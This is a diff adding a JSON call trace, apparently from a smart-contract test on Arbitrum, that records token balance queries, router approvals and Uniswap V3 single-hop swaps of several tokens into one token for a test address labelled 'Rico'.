+        "args": "ExactInputSingleParams({ tokenIn: 0x5979D7b546E38E414F7E9822514be443A4800529, tokenOut: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1713616643 [1.713e9], amountIn: 266618989782460718 [2.666e17], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }",
+        "original_code": null,
+        "description": null,
+        "return_value": "1604543 [1.604e6]"
+    },
+    {
+        "id": "123068",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 266618989782460718 [2.666e17], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b5979d7b546e38e414f7e9822514be443a4800529000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "266618989782460718 [2.666e17], -1604543 [-1.604e6]"
+    },
+    {
+        "id": "10163",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1604543 [1.604e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "9463",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1604543 [1.604e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3077",
+        "args": "0x7092e723285fe1381a3a59C0d438f53d2c26D9E8",
+        "original_code": null,
+        "description": null,
+        "return_value": "441239489704298 [4.412e14]"
+    },
+    {
+        "id": "2530",
+        "args": "0x7092e723285fe1381a3a59C0d438f53d2c26D9E8",
+        "original_code": null,
+        "description": null,
+        "return_value": "441239489704298 [4.412e14]"
+    },
+    {
+        "id": "13171",
+        "args": "266618989782460718 [2.666e17], -1604543 [-1.604e6], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b5979d7b546e38e414f7e9822514be443a4800529000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "9115",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7092e723285fe1381a3a59C0d438f53d2c26D9E8, 266618989782460718 [2.666e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "8559",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7092e723285fe1381a3a59C0d438f53d2c26D9E8, 266618989782460718 [2.666e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1077",
+        "args": "0x7092e723285fe1381a3a59C0d438f53d2c26D9E8",
+        "original_code": null,
+        "description": null,
+        "return_value": "267060229272165016 [2.67e17]"
+    },
+    {
+        "id": "530",
+        "args": "0x7092e723285fe1381a3a59C0d438f53d2c26D9E8",
+        "original_code": null,
+        "description": null,
+        "return_value": "267060229272165016 [2.67e17]"
+    },
+    {
+        "id": "1296",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "287173939050505854 [2.871e17]"
+    },
+    {
+        "id": "553",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "287173939050505854 [2.871e17]"
+    },
+    {
+        "id": "25308",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 287173939050505854 [2.871e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24562",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 287173939050505854 [2.871e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "76980",
+        "args": "ExactInputSingleParams({ tokenIn: 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, tokenOut: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1713616643 [1.713e9], amountIn: 287173939050505854 [2.871e17], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }",
+        "original_code": null,
+        "description": null,
+        "return_value": "872150727 [8.721e8]"
+    },
+    {
+        "id": "69548",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 287173939050505854 [2.871e17], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b82af49447d8a07e3bd95bd0d56f35241523fbab1000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "287173939050505854 [2.871e17], -872150727 [-8.721e8]"
+    },
+    {
+        "id": "10163",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 872150727 [8.721e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "9463",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 872150727 [8.721e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3296",
+        "args": "0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c",
+        "original_code": null,
+        "description": null,
+        "return_value": "347571490444047882460 [3.475e20]"
+    },
+    {
+        "id": "2553",
+        "args": "0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c",
+        "original_code": null,
+        "description": null,
+        "return_value": "347571490444047882460 [3.475e20]"
+    },
+    {
+        "id": "13752",
+        "args": "287173939050505854 [2.871e17], -872150727 [-8.721e8], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b82af49447d8a07e3bd95bd0d56f35241523fbab1000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "9680",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c, 287173939050505854 [2.871e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "8928",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c, 287173939050505854 [2.871e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1296",
+        "args": "0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c",
+        "original_code": null,
+        "description": null,
+        "return_value": "347858664383098388314 [3.478e20]"
+    },
+    {
+        "id": "553",
+        "args": "0xc473e2aEE3441BF9240Be85eb122aBB059A3B57c",
+        "original_code": null,
+        "description": null,
+        "return_value": "347858664383098388314 [3.478e20]"
+    },
+    {
+        "id": "1296",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "300000000 [3e8]"
+    },
+    {
+        "id": "553",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "300000000 [3e8]"
+    },
+    {
+        "id": "27939",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 300000000 [3e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "27193",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 300000000 [3e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "461654",
+        "args": "ExactInputSingleParams({ tokenIn: 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, tokenOut: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1713616643 [1.713e9], amountIn: 300000000 [3e8], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }",
+        "original_code": null,
+        "description": null,
+        "return_value": "50848707 [5.084e7]"
+    },
+    {
+        "id": "454193",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 300000000 [3e8], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bff970a61a04b1ca14834a43f5de4533ebddb5cc8000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "-50848707 [-5.084e7], 300000000 [3e8]"
+    },
+    {
+        "id": "10163",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50848707 [5.084e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "9463",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50848707 [5.084e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3296",
+        "args": "0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d",
+        "original_code": null,
+        "description": null,
+        "return_value": "101204834 [1.012e8]"
+    },
+    {
+        "id": "2553",
+        "args": "0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d",
+        "original_code": null,
+        "description": null,
+        "return_value": "101204834 [1.012e8]"
+    },
+    {
+        "id": "16549",
+        "args": "-50848707 [-5.084e7], 300000000 [3e8], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bff970a61a04b1ca14834a43f5de4533ebddb5cc8000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "12463",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d, 300000000 [3e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "11711",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d, 300000000 [3e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1296",
+        "args": "0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d",
+        "original_code": null,
+        "description": null,
+        "return_value": "401204834 [4.012e8]"
+    },
+    {
+        "id": "553",
+        "args": "0xD2D3B78fEf22406696EF9E7fE9BbEcf98802690d",
+        "original_code": null,
+        "description": null,
+        "return_value": "401204834 [4.012e8]"
+    },
+    {
+        "id": "1250",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "15068068008 [1.506e10]"
+    },
+    {
+        "id": "553",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "15068068008 [1.506e10]"
+    }
+]
